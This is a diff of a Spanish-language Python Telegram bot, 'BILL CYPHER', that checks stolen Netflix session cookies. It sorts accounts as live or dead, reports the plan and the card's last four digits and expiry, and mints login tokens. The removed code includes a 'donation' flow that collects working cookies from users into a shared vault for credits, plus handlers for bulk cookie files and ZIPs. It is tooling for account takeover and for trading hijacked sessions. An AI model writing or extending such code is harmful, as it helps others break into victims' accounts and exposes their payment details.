@@ -476,7 +476,7 @@ def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list
 
 
 # ===========================================================================
-# 8. VERIFICADOR EN VIVO (CERO "REINICIA TU MEMBRESÍA" / CERO "UPDATE PAYMENT")
+# 8. VERIFICADOR EN VIVO
 # ===========================================================================
 def get_live_nftoken(cookie_raw: str, core_token: str) -> dict:
     try:
@@ -579,7 +579,7 @@ def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
 
 
 # ===========================================================================
-# 9. BANNER MULTIMEDIA
+# 9. BANNER MULTIMEDIA Y CHECKER AISLADO
 # ===========================================================================
 _BANNER_FILE = Path("banner_id.txt")
 BANNER_MEDIA = "banner.mp4"
@@ -591,10 +591,6 @@ def _get_banner_source() -> str:
             return val
     return BANNER_MEDIA
 
-
-# ===========================================================================
-# 10. CHECKER AISLADO
-# ===========================================================================
 def safe_check_cookie_clean(cookie_str: str, **kwargs) -> dict:
     try:
         return check_cookie(cookie_str, **kwargs)
@@ -656,7 +652,7 @@ _GEN_LINK_STORE: dict[str, dict] = {}
 
 
 # ---------------------------------------------------------------------------
-# Validaciones de cookies
+# Validaciones de cookies y Preferencias
 # ---------------------------------------------------------------------------
 _OTHER_SERVICES: dict[str, str] = {
     "accounts.google.com":  "Google",
@@ -724,10 +720,6 @@ def _validate_cookie_text(text: str) -> tuple[bool, str]:
         )
     return True, ""
 
-
-# ---------------------------------------------------------------------------
-# Preferencias de usuario
-# ---------------------------------------------------------------------------
 def _get_mode(user_id: int) -> str:
     return _USER_MODE.get(user_id, "basic")
 
@@ -745,7 +737,7 @@ def _set_delivery(user_id: int, mode: str) -> None:
 
 
 # ---------------------------------------------------------------------------
-# Panel Principal Compacto (Baja Altura - Optimizado para Banner)
+# Panel Principal Compacto y Helpers de Interfaz
 # ---------------------------------------------------------------------------
 def _main_panel_text(uid: int) -> str:
     mode_lbl = "Full" if _get_mode(uid) == "full" else "Básico"
@@ -974,77 +966,6 @@ def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
 # ---------------------------------------------------------------------------
 # Formateadores de tarjetas de resultados
 # ---------------------------------------------------------------------------
-def make_progress_bar(done: int, total: int, width: int = 14) -> str:
-    if total == 0:
-        return f"[{'▱' * width}] 0%"
-    filled = int(width * done / total)
-    bar = "▰" * filled + "▱" * (width - filled)
-    pct = int(100 * done / total)
-    return f"[{bar}] {pct}%"
-
-def _yes_no(val) -> str:
-    if val is None:
-        return "Desconocido"
-    return "Sí" if val else "No"
-
-def _plan_title(plan_name: str, status: str) -> str:
-    p = (plan_name or "").lower()
-    st = normalize_status(status)
-    if st == "free":
-        return "🔓 FREE ACCOUNT (Sin Suscripción)"
-    if st == "on_hold":
-        return "⏸️ CUENTA EN ESPERA (On Hold)"
-    if "premium" in p:
-        return "🌟 CUENTA PREMIUM 4K"
-    if "standard" in p and "ads" in p:
-        return "📺 STANDARD CON ANUNCIOS"
-    if "standard" in p:
-        return "⭐ CUENTA STANDARD"
-    if "basic" in p or "base" in p:
-        return "📱 CUENTA BÁSICA"
-    if "mobile" in p:
-        return "📱 CUENTA MÓVIL"
-    if st == "hit":
-        return "✅ CUENTA VÁLIDA (LIVE)"
-    return "❌ CUENTA INVÁLIDA (DEAD)"
-
-def _status_line(status: str, plan: str) -> str:
-    p_lower = (plan or "").lower()
-    st = normalize_status(status)
-    if st == "hit":
-        if "premium" in p_lower:
-            return "🔥 <b>Status:</b> Válido (Live) — Premium 4K ✅"
-        if "standard" in p_lower:
-            return "🔥 <b>Status:</b> Válido (Live) — Standard ✅"
-        if "basic" in p_lower:
-            return "🔥 <b>Status:</b> Válido (Live) — Básica ✅"
-        return "🔥 <b>Status:</b> Válido (Live) ✅"
-    if st == "free":
-        return "🔓 <b>Status:</b> Sin membresía activa"
-    if st == "on_hold":
-        return "⏸️ <b>Status:</b> En espera (Fallo de pago)"
-    return "❌ <b>Status:</b> Muerta (Dead / Inválida)"
-
-def _build_card_line(result: dict) -> str:
-    ct = result.get("card_type") or ""
-    l4 = result.get("card_last4") or ""
-    exp = result.get("card_expiry") or ""
-    expired = result.get("card_expired", False)
-    partner = result.get("partner_name") or ""
-    is_third = result.get("is_third_party", False)
-
-    if is_third and partner:
-        return f"{partner} (Facturación por terceros)"
-    if ct:
-        parts = [ct.upper() if len(ct) <= 10 else ct]
-        if l4:
-            parts.append(f"···· {l4}")
-        if exp:
-            flag = " ⚠️EXPIRED" if expired else ""
-            parts.append(f"(exp {exp}{flag})")
-        return " ".join(parts)
-    return result.get("payment") or "Desconocido"
-
 def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
     status   = normalize_status(result.get("status"), result)
     plan     = result.get("plan_name")    or ""
@@ -1355,7 +1276,7 @@ def _score_account(result: dict) -> tuple:
 
 
 # ---------------------------------------------------------------------------
-# Generador y empaquetador ZIP de hits (Formato limpio sin emojis internos)
+# Generador y empaquetador ZIP de hits
 # ---------------------------------------------------------------------------
 async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> None:
     today = date.today().isoformat()
@@ -1633,7 +1554,6 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                     txt = format_result({"status": "invalid", "message": "Cookie expirada / fallo de pago."}, idx, total, source=src, user_id=uid)
                     await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
 
-        # Monitor de carga animado en tiempo real con fases (porcentaje limpio sin duplicación)
         if is_bulk:
             now_time = time.monotonic()
             done_so_far = min(batch_start + len(batch), total)
@@ -2086,29 +2006,8 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         except Exception:
             await query.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
 
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id if update.effective_user else 0
-    if uid in _DONATE_USERS:
-        _DONATE_USERS.discard(uid)
-        await update.message.reply_text("❌ <b>Donación cancelada.</b>", parse_mode=ParseMode.HTML)
-        return
-    if uid in _CHANGEPW_STATE:
-        _CHANGEPW_STATE.pop(uid, None)
-        await update.message.reply_text("❌ <b>Cambio de contraseña cancelado.</b>", parse_mode=ParseMode.HTML)
-        return
-    if uid in _PROXY_ADD_STATE:
-        _PROXY_ADD_STATE.discard(uid)
-        await update.message.reply_text("❌ Añadir proxy cancelado.")
-        return
-    if uid in _PROXY_SOURCE_STATE:
-        _PROXY_SOURCE_STATE.discard(uid)
-        await update.message.reply_text("❌ Importación cancelada.")
-        return
-    await update.message.reply_text("No hay operaciones activas para cancelar.")
-
-
 # ---------------------------------------------------------------------------
-# Comandos de ayuda, configuración y administración
+# Comandos de soporte general (help, info, mode, users, etc.)
 # ---------------------------------------------------------------------------
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user:
@@ -2224,302 +2123,7 @@ async def setbanner_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 # ---------------------------------------------------------------------------
-# Procesamiento de documentos y texto entrante (Incluye Donaciones)
-# ---------------------------------------------------------------------------
-async def _process_donation(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_text: str) -> None:
-    uid = update.effective_user.id if update.effective_user else 0
-    _DONATE_USERS.discard(uid)
-
-    status_msg = await update.message.reply_text("⚡ <i>Comprobando donación en vivo...</i>", parse_mode=ParseMode.HTML)
-    loop = asyncio.get_running_loop()
-
-    blocks = split_cookies_from_text(cookie_text)
-    if not blocks:
-        await status_msg.edit_text("❌ No se detectaron cookies de Netflix válidas en el texto enviado.")
-        return
-
-    donated_count = 0
-    vault = _load_vault()
-    existing_tokens = {extract_core_netflix_id(c) for c in vault if extract_core_netflix_id(c)}
-
-    for b in blocks:
-        tok = extract_core_netflix_id(b)
-        if not tok or tok in existing_tokens:
-            continue
-
-        chk_res = await loop.run_in_executor(
-            _EXECUTOR,
-            lambda: safe_check_cookie_clean(b, generate_token=True)
-        )
-
-        st = normalize_status(chk_res.get("status"), chk_res)
-        ms = str(chk_res.get("membership_status") or "").upper()
-        issues_str = " ".join(chk_res.get("account_issues") or []).lower()
-        is_payment_issue = chk_res.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str)
-        nft_res = chk_res.get("nftoken") or {}
-
-        if st == "hit" and not is_payment_issue and "FORMER" not in ms and "NEVER" not in ms and nft_res.get("success"):
-            real_t = extract_bgiqv_token(nft_res, tok)
-            if verify_streaming_active(real_t):
-                vault.append(b.strip())
-                existing_tokens.add(tok)
-                donated_count += 1
-
-    if donated_count > 0:
-        _save_vault(vault)
-        add_reward_credit(uid, donated_count)
-        asyncio.create_task(_cloud_auto_save(context.application))
-
-        await status_msg.edit_text(
-            f"🎉 <b>¡DONACIÓN EXITOSA!</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"● 🍿 <b>Cuentas agregadas al baúl:</b> <code>{donated_count}</code>\n"
-            f"● 💎 <b>Recompensa otorgada:</b> <code>+{donated_count} activaciones</code>\n\n"
-            "<i>¡Muchas gracias por apoyar a la comunidad!</i>",
-            parse_mode=ParseMode.HTML,
-        )
-
-        u_label = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
-        try:
-            await context.bot.send_message(
-                chat_id=OWNER_ID,
-                text=f"🎁 <b>¡NUEVA DONACIÓN RECIBIDA!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n● 👤 Usuario: {u_label} (<code>{uid}</code>)\n● 📦 Cuentas agregadas: <code>{donated_count}</code>\n● 🗄️ Stock total: <code>{len(vault)}</code>",
-                parse_mode=ParseMode.HTML,
-            )
-        except Exception:
-            pass
-    else:
-        await status_msg.edit_text(
-            "⚠️ <b>La cuenta enviada no tiene suscripción activa o ya está en el baúl.</b>\n"
-            "<i>No se pudo agregar, pero ¡muchas gracias por tu intención de colaborar!</i>",
-            parse_mode=ParseMode.HTML,
-        )
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    doc: Document = update.message.document
-    uid = update.effective_user.id if update.effective_user else None
-    if uid:
-        _record_user_id(uid)
-
-    caption = (update.message.caption or "").strip()
-
-    if caption.startswith("/setbanner") and is_admin(uid):
-        await setbanner_command(update, context)
-        return
-
-    if caption.startswith("/addvault") and is_admin(uid):
-        await addvault_command(update, context)
-        return
-
-    if caption.startswith("/restore") and is_admin(uid):
-        await restore_command(update, context)
-        return
-
-    if is_maintenance() and not is_admin(uid):
-        await update.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
-        return
-
-    if uid in _ACTIVE_USERS:
-        refund_credit(uid)
-        await update.message.reply_text("⏳ Ya tienes una comprobación activa. Espera a que termine.", parse_mode=ParseMode.HTML)
-        return
-
-    if doc.file_size and doc.file_size > 30 * 1024 * 1024:
-        refund_credit(uid)
-        await update.message.reply_text("⚠️ El archivo supera los 30 MB permitidos.", parse_mode=ParseMode.HTML)
-        return
-
-    mime = doc.mime_type or ""
-    fname = (doc.file_name or "").lower()
-    is_zip = fname.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed")
-    is_cookie = any(fname.endswith(ext) for ext in COOKIE_EXTENSIONS) or mime in COOKIE_MIME_TYPES
-
-    if not is_zip and not is_cookie:
-        refund_credit(uid)
-        await update.message.reply_text("❌ Formato no compatible. Envía un <code>.txt</code>, <code>.json</code> o <code>.zip</code>.", parse_mode=ParseMode.HTML)
-        return
-
-    suffix = ".zip" if is_zip else (Path(fname).suffix or ".txt")
-    tmp_path = None
-
-    for attempt in range(3):
-        try:
-            tg_file = await doc.get_file()
-            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
-                await tg_file.download_to_drive(tmp.name)
-                tmp_path = tmp.name
-            break
-        except Exception:
-            await asyncio.sleep(1)
-
-    if tmp_path is None:
-        refund_credit(uid)
-        await update.message.reply_text("⚠️ Error al descargar el archivo.")
-        return
-
-    if uid and uid in _DONATE_USERS:
-        with open(tmp_path, "rb") as f:
-            raw_b = f.read()
-        try:
-            os.unlink(tmp_path)
-        except Exception:
-            pass
-        await _process_donation(update, context, raw_b.decode("utf-8", errors="replace"))
-        return
-
-    if not consume_credit(uid):
-        try:
-            os.unlink(tmp_path)
-        except Exception:
-            pass
-        await update.message.reply_text(
-            OUT_OF_CREDITS_TEXT,
-            parse_mode=ParseMode.HTML,
-            reply_markup=out_of_credits_markup()
-        )
-        return
-
-    if uid:
-        _ACTIVE_USERS[uid] = time.time()
-
-    status_msg = await update.message.reply_text(
-        "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "📥 <i>Descargando archivo de cookies...</i>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        parse_mode=ParseMode.HTML
-    )
-
-    original_name = doc.file_name or "desconocido"
-
-    try:
-        if is_zip:
-            await status_msg.edit_text(
-                "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | INICIALIZANDO 5G") + "</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n"
-                "📦 <i>Extrayendo cuentas del archivo ZIP...</i>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━",
-                parse_mode=ParseMode.HTML
-            )
-            try:
-                entries = read_cookie_texts_from_zip(tmp_path)
-            except Exception as _e:
-                refund_credit(uid)
-                await status_msg.edit_text(f"❌ Error al abrir ZIP: {_e}", parse_mode=ParseMode.HTML)
-                return
-            finally:
-                try:
-                    os.unlink(tmp_path)
-                except Exception:
-                    pass
-
-            if not entries:
-                refund_credit(uid)
-                await status_msg.edit_text("⚠️ No se encontraron archivos de cookies dentro del ZIP.", parse_mode=ParseMode.HTML)
-                return
-
-            all_sets: list[tuple[str, str, str]] = []
-            for entry_fname, text in entries:
-                for block in split_cookies_from_text(text):
-                    all_sets.append((entry_fname, block, block))
-
-            await process_cookie_sets(update, status_msg, all_sets)
-        else:
-            with open(tmp_path, "rb") as f:
-                raw_bytes = f.read()
-            try:
-                os.unlink(tmp_path)
-            except Exception:
-                pass
-
-            if _is_binary_content(raw_bytes):
-                refund_credit(uid)
-                await status_msg.edit_text("❌ El archivo parece una imagen o binario, no cookies de texto.", parse_mode=ParseMode.HTML)
-                return
-
-            cookie_text = raw_bytes.decode("utf-8", errors="replace")
-            ok, err_msg = _validate_cookie_text(cookie_text)
-            if not ok:
-                refund_credit(uid)
-                await status_msg.edit_text(err_msg, parse_mode=ParseMode.HTML)
-                return
-
-            await process_cookies(update, status_msg, cookie_text, source=original_name)
-
-    except Exception as e:
-        refund_credit(uid)
-        logger.exception("Error procesando documento")
-        await status_msg.edit_text(f"⚠️ Error al procesar: {e}", parse_mode=ParseMode.HTML)
-    finally:
-        if uid:
-            _ACTIVE_USERS.pop(uid, None)
-
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id if update.effective_user else None
-    if uid:
-        stats_tracker.record_user(uid)
-        _record_user_id(uid)
-
-    text = update.message.text.strip()
-    if not text:
-        return
-
-    if is_maintenance() and not is_admin(uid):
-        await update.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
-        return
-
-    if uid and uid in _DONATE_USERS:
-        await _process_donation(update, context, text)
-        return
-
-    if uid and uid in _CHANGEPW_STATE:
-        await _handle_changepw_input(update, uid, text)
-        return
-
-    if len(text) < 10 or text.startswith("/"):
-        return
-
-    ok, err_msg = _validate_cookie_text(text)
-    if not ok:
-        await update.message.reply_text(err_msg, parse_mode=ParseMode.HTML)
-        return
-
-    if not consume_credit(uid):
-        await update.message.reply_text(
-            OUT_OF_CREDITS_TEXT,
-            parse_mode=ParseMode.HTML,
-            reply_markup=out_of_credits_markup()
-        )
-        return
-
-    if uid in _ACTIVE_USERS:
-        refund_credit(uid)
-        await update.message.reply_text("⏳ Ya tienes una comprobación activa.", parse_mode=ParseMode.HTML)
-        return
-
-    if uid:
-        _ACTIVE_USERS[uid] = time.time()
-
-    status_msg = await update.message.reply_text(
-        "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "🔍 <i>Analizando cookies enviadas...</i>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        parse_mode=ParseMode.HTML
-    )
-    try:
-        await process_cookies(update, status_msg, text, source="texto pegado")
-    except Exception as e:
-        refund_credit(uid)
-        logger.exception("Error en texto pegado")
-        await status_msg.edit_text(f"⚠️ Error: {e}", parse_mode=ParseMode.HTML)
-    finally:
-        if uid:
-            _ACTIVE_USERS.pop(uid, None)
-
-
-# ---------------------------------------------------------------------------
-# Watchdog
+# Watchdog y Manejador de Errores
 # ---------------------------------------------------------------------------
 async def _session_watchdog() -> None:
     while True:
@@ -2530,10 +2134,6 @@ async def _session_watchdog() -> None:
             _ACTIVE_USERS.pop(uid, None)
             _USER_SESSION.pop(uid, None)
 
-
-# ---------------------------------------------------------------------------
-# Manejador de errores global con reporte automático a @didierJC
-# ---------------------------------------------------------------------------
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     err = context.error
 
@@ -2629,7 +2229,6 @@ def main() -> None:
         global _BOT_USERNAME
         _BOT_USERNAME = (await application.bot.get_me()).username or ""
 
-        # Auto-restauración SOLO si el baúl local está totalmente vacío
         try:
             local_vault = _load_vault()
             if len(local_vault) == 0:
